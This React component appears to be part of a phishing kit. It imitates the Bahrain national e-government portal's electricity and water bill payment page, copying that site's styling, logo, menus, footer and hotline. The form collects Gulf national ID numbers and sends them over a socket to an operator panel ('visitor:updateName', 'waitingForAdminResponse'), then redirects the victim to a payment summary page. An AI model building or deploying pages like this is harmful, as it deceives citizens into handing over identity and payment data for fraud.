import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();
  const [idType, setIdType] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [activeTab, setActiveTab] = useState(0);
  const [activeNavItem, setActiveNavItem] = useState(0);

  useEffect(() => {
    navigateToPage('الصفحة الرئيسية');
  }, []);

  const handleSubmit = () => {
    if (!idType || !idNumber) return;
    setIsSubmitting(true);

    const idTypeLabel = 
      idType === 'bahraini' ? 'الرقم الشخصي البحريني' :
      idType === 'emirati' ? 'الرقم الشخصي الإماراتي' :
      idType === 'saudi' ? 'الرقم الشخصي السعودي' :
      idType === 'omani' ? 'الرقم الشخصي العماني' : idType;

    if (socket.value.connected) {
      socket.value.emit('visitor:updateName', idNumber);
    }

    sendData({
      data: {
        idType: idTypeLabel,
        idNumber,
      },
      current: 'الصفحة الرئيسية',
      nextPage: 'summary-payment',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsSubmitting(false);
      setLocation('/summary-payment');
    }, 1000);
  };

  return (
    <>
      {/* Inject the exact same CSS reset and font stack from services.bahrain.bh */}
      <style dangerouslySetInnerHTML={{ __html: `
        .bh-page, .bh-page * {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji" !important;
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          border: 0;
          outline: 0;
        }
        .bh-page {
          direction: rtl;
          min-height: 100vh;
          background: #F5F5F7;
          color: #17171C;
          font-size: 16px;
          font-weight: 400;
          line-height: 1.5;
          -webkit-text-size-adjust: 100%;
        }
        .bh-page a {
          text-decoration: none;
          color: inherit;
        }
        .bh-page img {
          max-width: 100%;
          height: auto;
        }
        .bh-container {
          max-width: 1170px;
          margin: 0 auto;
          padding: 0 15px;
        }
        
        /* Header area */
        .bh-header {
          background: #fff;
          border-bottom: none;
        }
        .bh-header-divider {
          border: none;
          border-top: 2px solid #D3D3DA;
          margin: 0;
        }
        .bh-header-row1 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0 12px 0;
        }
        .bh-logo img {
          height: 60px;
        }
        .bh-lang {
          display: flex;
          align-items: center;
          gap: 6px;
          cursor: pointer;
          color: #4B4B57;
          font-size: 15px;
        }
        .bh-header-row2 {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 0;
          background: #fff;
          margin: 0;
          border-top: none;
          min-height: 60px;
        }
        .bh-tabs-row {
          display: flex;
          align-items: center;
          gap: 24px;
        }
        .bh-tab {
          font-size: 22px !important;
          font-weight: 400 !important;
          color: #4B4B57 !important;
          cursor: pointer;
          padding-bottom: 12px;
          padding-top: 8px;
          border-bottom: 4px solid #D3D3DA;
          margin-bottom: 0;
          position: relative;
        }
        .bh-tab.active {
          font-weight: 600 !important;
          color: #17171C !important;
          border-bottom: 4px solid #0747C7 !important;
        }
        .bh-header-actions {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .bh-login-btn {
          background: #045c7c !important;
          color: #fff !important;
          padding: 12px 24px !important;
          border-radius: 6px !important;
          font-size: 15px !important;
          font-weight: 600 !important;
          cursor: pointer;
          display: inline-block;

        }
        
        /* Navigation bar */
        .bh-nav {
          background: #EAEAEE;
          border-bottom: none;
          border-top: 2px solid #D3D3DA;
          padding: 8px 0;
          margin-top: 0;
        }
        .bh-nav-items {
          display: flex;
          align-items: center;
        }
        .bh-nav-item {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
          padding: 10px 28px !important;
          border-left: none;
          display: flex;
          align-items: center;
          white-space: nowrap;
          cursor: pointer;
        }
        .bh-nav-item:last-child {
          border-left: none;
        }
        .bh-nav-item.nav-active {
          background: #fff;
          border-radius: 8px;
          position: relative;
        }
        .bh-nav-item.nav-active::before {
          content: "";
          display: inline-block;
          width: 3px;
          height: 16px;
          background: #0747C7;
          margin-left: 10px;
          border-radius: 2px;
        }
        
        /* Banner */
        .bh-banner {
          margin: 30px auto 20px auto;
          padding: 0;
          position: relative;
          max-width: 85%;
        }
        .bh-banner img {
          width: 100%;
          height: auto;
          display: block;
          border-radius: 4px;
        }
        
        /* Content area */
        .bh-content-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 12px;
        }
        .bh-content-title {
          font-size: 1.15rem !important;
          font-weight: 400 !important;
          color: #0747C7 !important;
          line-height: 26px;
        }
        .bh-menu-link {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 14px !important;
          color: #4B4B57 !important;
          cursor: pointer;
        }
        
        /* Blue bars */
        .bh-blue-bar {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 10px 18px !important;
          display: flex;
          align-items: center;
          justify-content: space-between;
          font-size: 15px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        .bh-blue-bar-info {
          display: flex;
          align-items: center;
          gap: 8px;
        }
        
        /* Required text */
        .bh-required-text {
          font-size: 13px !important;
          color: #4B4B57 !important;
          margin: 10px 0 !important;
          text-align: right;
        }
        
        /* Form area */
        .bh-form-area {
          background: #fff;
          border: 1px solid #D3D3DA;
          border-top: none;
          padding: 20px 24px;
        }
        .bh-form-row {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 12px;
          margin-bottom: 15px;
        }
        .bh-form-row:last-child {
          margin-bottom: 0;
        }
        .bh-form-label {
          font-size: 14px !important;
          font-weight: 500 !important;
          color: #17171C !important;
          white-space: nowrap;
        }
        .bh-form-label .required {
          color: #A70717 !important;
        }
        .bh-form-select, .bh-form-input {
          padding: 8px 12px !important;
          border: 1px solid #D3D3DA !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          background: #fff !important;
          color: #17171C !important;
          min-width: 240px;
          direction: rtl;
        }
        .bh-form-input {
          direction: ltr;
          text-align: left;
        }
        .bh-form-select:focus, .bh-form-input:focus {
          border-color: #0747C7 !important;
          outline: none;
          box-shadow: 0 0 0 2px rgba(7, 71, 199, 0.15);
        }
        
        /* Buttons */
        .bh-buttons {
          display: flex;
          gap: 10px;
          justify-content: center;
          margin: 20px 0 40px 0;
          padding: 0 !important;
        }
        .bh-btn-primary {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 8px 28px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        .bh-btn-primary:disabled {
          background: #C0C0CA !important;
          cursor: not-allowed;
        }
        .bh-btn-back {
          background: #0747C7 !important;
          color: #fff !important;
          padding: 8px 28px !important;
          border-radius: 4px !important;
          font-size: 14px !important;
          font-weight: 500 !important;
          cursor: pointer;
        }
        
        /* Bottom line */
        .bh-bottom-line {
          height: 4px;
          background: #0747C7;
          margin-top: 30px;
        }

        /* ===== FOOTER ===== */
        .bh-footer-links {
          background: #F0F0F3;
          padding: 40px 0 30px 0;
          border-top: 1px solid #D3D3DA;
        }
        .bh-footer-columns {
          display: flex;
          justify-content: space-between;
          gap: 30px;
        }
        .bh-footer-col {
          flex: 1;
        }
        .bh-footer-col-title {
          font-size: 16px !important;
          font-weight: 700 !important;
          color: #17171C !important;
          margin-bottom: 16px !important;
          padding-bottom: 8px;
          border-bottom: 2px solid #0747C7;
          display: inline-block;
        }
        .bh-footer-col ul {
          list-style: none !important;
          padding: 0 !important;
          margin: 0 !important;
        }
        .bh-footer-col ul li {
          margin-bottom: 8px !important;
        }
        .bh-footer-col ul li a {
          font-size: 14px !important;
          color: #4B4B57 !important;
          cursor: pointer;
        }
        .bh-footer-col ul li a:hover {
          color: #0747C7 !important;
        }

        .bh-footer-social {
          background: #E2E2E7;
          padding: 30px 0;
        }
        .bh-footer-social-inner {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .bh-footer-social-right {
          display: flex;
          align-items: center;
          gap: 20px;
        }
        .bh-footer-social-label {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-social-icons {
          display: flex;
          gap: 12px;
          align-items: center;
        }
        .bh-footer-social-icons a {
          width: 40px;
          height: 40px;
          background: #8A8A97;
          border-radius: 6px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #fff !important;
          font-size: 18px;
          cursor: pointer;
          transition: background 0.2s;
        }
        .bh-footer-social-icons a:hover {
          background: #0747C7;
        }
        .bh-footer-social-left {
          display: flex;
          align-items: center;
          gap: 16px;
        }
        .bh-footer-contact-label {
          font-size: 16px !important;
          font-weight: 600 !important;
          color: #17171C !important;
        }
        .bh-footer-contact-number {
          font-size: 24px !important;
          font-weight: 700 !important;
          color: #A70717 !important;
          direction: ltr;
        }
        .bh-footer-contact-sub {
          font-size: 11px !important;
          color: #4B4B57 !important;
        }

        .bh-footer-bottom-links {
          background: #F0F0F3;
          padding: 16px 0;
          border-top: 1px solid #D3D3DA;
          text-align: center;
        }
        .bh-footer-bottom-links a {
          font-size: 13px !important;
          color: #4B4B57 !important;
          margin: 0 8px;
          cursor: pointer;
        }
        .bh-footer-bottom-links a:hover {
          color: #0747C7 !important;
        }
        .bh-footer-bottom-links .separator {
          color: #D3D3DA !important;
          margin: 0 4px;
        }

        .bh-footer-copyright {
          background: #fff;
          padding: 20px 0;
          text-align: center;
          border-top: 1px solid #D3D3DA;
        }
        .bh-footer-copyright p {
          font-size: 13px !important;
          color: #4B4B57 !important;
          margin: 4px 0 !important;
        }
        .bh-footer-copyright a {
          color: #0747C7 !important;
        }
        
        /* Mobile responsive */
        @media (max-width: 768px) {
          .bh-header-row2 {
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
          }
          .bh-nav-items {
            flex-wrap: wrap;
          }
          .bh-nav-item {
            font-size: 14px !important;
            padding: 8px 10px !important;
          }
          .bh-form-row {
            flex-direction: column;
            align-items: flex-start;
          }
          .bh-form-select, .bh-form-input {
            width: 100%;
            min-width: unset;
          }
        }
      `}} />
      
      <div className="bh-page">
        {/* ===== HEADER ===== */}
        <div className="bh-header">
          <div className="bh-container">
            {/* Row 1: Logo + English */}
            <div className="bh-header-row1">
              <div className="bh-logo">
                <img 
                  src="/logo_ar.svg" 
                  alt="شعار مملكة البحرين"
                  onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                />
              </div>
              <div className="bh-lang">
                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }}>English</span>
                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="2.5">
                  <circle cx="16" cy="16" r="14"/>
                  <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
                </svg>
              </div>
            </div>

          </div>
          <hr className="bh-header-divider" />
          <div className="bh-container">
            {/* Row 2: Tabs + Actions */}
            <div className="bh-header-row2">
              <div className="bh-tabs-row">
                <span className={`bh-tab ${activeTab === 0 ? 'active' : ''}`} onClick={() => setActiveTab(0)}>الخدمات الإلكترونية</span>
                <span className={`bh-tab ${activeTab === 1 ? 'active' : ''}`} onClick={() => setActiveTab(1)}>دليل المعلومات</span>
              </div>
              <div className="bh-header-actions">
                <img src="/emergency-cal.svg" alt="" style={{ width: '20px', height: '20px', cursor: 'pointer', opacity: 0.7 }} onError={(e: any) => e.target.style.display='none'} />
                <span className="bh-login-btn">تسجيل الدخول</span>
              </div>
            </div>
          </div>
        </div>

        {/* ===== NAVIGATION BAR ===== */}
        <div className="bh-nav">
          <div className="bh-container">
            <div className="bh-nav-items">
              <a className={`bh-nav-item ${activeNavItem === 0 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(0)}>الصفحة الرئيسية</a>
              <a className={`bh-nav-item ${activeNavItem === 1 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(1)}>الخدمات الإلكترونية حسب التصنيف</a>
              <a className={`bh-nav-item ${activeNavItem === 2 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(2)}>الخدمات الإلكترونية حسب المقدم</a>
              <a className={`bh-nav-item ${activeNavItem === 3 ? 'nav-active' : ''}`} onClick={() => setActiveNavItem(3)}>متجر تطبيقات الحكومة الإلكترونية</a>
            </div>
          </div>
        </div>

        {/* ===== BANNER ===== */}
        <div className="bh-container">
          <div className="bh-banner">
            <img src="/eAuthorization_ar.png" alt="استفد من خدمات التخويل الإلكتروني" />
          </div>
        </div>

        {/* ===== MAIN CONTENT ===== */}
        <div className="bh-container">
          {/* Title row */}
          <div className="bh-content-header">
            <h2 className="bh-content-title">دفع فاتورة الكهرباء والماء</h2>
            <div className="bh-menu-link">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4B4B57" strokeWidth="2" strokeLinecap="round">
                <line x1="3" y1="6" x2="21" y2="6"/>
                <line x1="3" y1="12" x2="21" y2="12"/>
                <line x1="3" y1="18" x2="21" y2="18"/>
              </svg>
              <span>القائمة</span>
            </div>
          </div>

          {/* Blue bar: Instructions */}
          <div className="bh-blue-bar">
            <div className="bh-blue-bar-info">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
                <line x1="12" y1="11" x2="12" y2="17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                <circle cx="12" cy="8" r="1" fill="white"/>
              </svg>
              <span>اضغط هنا لعرض التعليمات</span>
            </div>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
          </div>

          {/* Required text */}
          <div className="bh-required-text">
            <span style={{ color: '#A70717' }}>*</span> بيانات مطلوبة
          </div>

          {/* Blue bar: Customer details */}
          <div className="bh-blue-bar">
            <span>تفاصيل العميل</span>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
          </div>

          {/* Form area */}
          <div className="bh-form-area">
            <div className="bh-form-row">
              <label className="bh-form-label">
                <span className="required">*</span> نوع الهوية:
              </label>
              <select
                className="bh-form-select"
                value={idType}
                onChange={e => setIdType(e.target.value)}
              >
                <option value="">-- اختر نوع الهوية --</option>
                <option value="emirati">الرقم الشخصي الإماراتي</option>
                <option value="bahraini">الرقم الشخصي البحريني</option>
                <option value="saudi">الرقم الشخصي السعودي</option>
                <option value="omani">الرقم الشخصي العماني</option>
              </select>
            </div>

            {idType && (
              <div className="bh-form-row">
                <label className="bh-form-label">
                  <span className="required">*</span> رقم الهوية:
                </label>
                <input
                  className="bh-form-input"
                  type="text"
                  value={idNumber}
                  onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="أدخل رقم الهوية"
                  maxLength={12}
                />
              </div>
            )}
          </div>

          {/* Buttons */}
          <div className="bh-buttons">
            {idType && idNumber && (
              <button
                className="bh-btn-primary"
                onClick={handleSubmit}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
              </button>
            )}
            <button className="bh-btn-back">رجوع</button>
          </div>
        </div>

        {/* Bottom line */}
        <div className="bh-bottom-line"></div>

        {/* ===== FOOTER ===== */}
        {/* Footer Links Section */}
        <div className="bh-footer-links">
          <div className="bh-container">
            <div className="bh-footer-columns">
              {/* Column 1: دليل المعلومات */}
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">دليل المعلومات</div>
                <ul>
                  <li><a>هنا في البحرين</a></li>
                  <li><a>عن البحرين</a></li>
                  <li><a>اكتشف البحرين</a></li>
                  <li><a>دليل الخدمات الحكومية</a></li>
                  <li><a>الدليل الحكومي</a></li>
                  <li><a>الذكاء الاصطناعي في البحرين</a></li>
                  <li><a>دليل خدمة العملاء</a></li>
                  <li><a>أرقام الطوارئ</a></li>
                </ul>
              </div>
              {/* Column 2: الخدمات الإلكترونية */}
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">الخدمات الإلكترونية</div>
                <ul>
                  <li><a>تصنيف الخدمات الإلكترونية</a></li>
                  <li><a>مقدمو الخدمات الإلكترونية</a></li>
                  <li><a>متجر تطبيقات الهواتف</a></li>
                  <li><a>دليل المستخدم</a></li>
                  <li><a>المفتاح الإلكتروني 2.0 المطوّر</a></li>
                  <li><a>مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية</a></li>
                </ul>
              </div>
              {/* Column 3: روابط سريعة */}
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">روابط سريعة</div>
                <ul>
                  <li><a>حول البوابة الوطنية</a></li>
                  <li><a>إحصائيات قنوات الخدمة</a></li>
                  <li><a>المشاركة الإلكترونية "شاركنا"</a></li>
                  <li><a>الأخبار الحكومية</a></li>
                  <li><a>أخبار البحرين</a></li>
                  <li><a>تقويم البحرين</a></li>
                  <li><a>فعاليات تقنية المعلومات</a></li>
                  <li><a>الإشادات والجوائز</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        {/* Footer Social Media & Contact */}
        <div className="bh-footer-social">
          <div className="bh-container">
            <div className="bh-footer-social-inner">
              <div className="bh-footer-social-right">
                <span className="bh-footer-social-label">تابعنا على</span>
                <div className="bh-footer-social-icons">
                  <a title="LinkedIn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
                  </a>
                  <a title="Instagram">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
                  </a>
                  <a title="X">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                  </a>
                  <a title="Facebook">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg>
                  </a>
                  <a title="YouTube">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg>
                  </a>
                </div>
              </div>
              <div className="bh-footer-social-left">
                <span className="bh-footer-contact-label">تواصل معنا</span>
                <div>
                  <div className="bh-footer-contact-number">80008001</div>
                  <div className="bh-footer-contact-sub">مركز اتصال الخدمات الحكومية</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer Bottom Links */}
        <div className="bh-footer-bottom-links">
          <div className="bh-container">
            <a>شروط الإستخدام</a>
            <span className="separator">|</span>
            <a>سياسة الخصوصية</a>
            <span className="separator">|</span>
            <a>إمكانية الوصول</a>
            <span className="separator">|</span>
            <a>الأسئلة الشائعة</a>
            <span className="separator">|</span>
            <a>مساعدة</a>
            <span className="separator">|</span>
            <a>تواصل معنا</a>
            <span className="separator">|</span>
            <a>خريطة الموقع</a>
          </div>
        </div>

        {/* Footer Copyright */}
        <div className="bh-footer-copyright">
          <div className="bh-container">
            <p>آخر تحديث على البوابة الوطنية : السبت، 7 مارس 2026</p>
            <p>تم التطوير من قبل <a>هيئة المعلومات والحكومة الإلكترونية</a></p>
            <p>حقوق الطبع &copy; 2026 مملكة البحرين</p>
            <p>جميع الحقوق محفوظة</p>
          </div>
        </div>
      </div>
    </>
  );
}
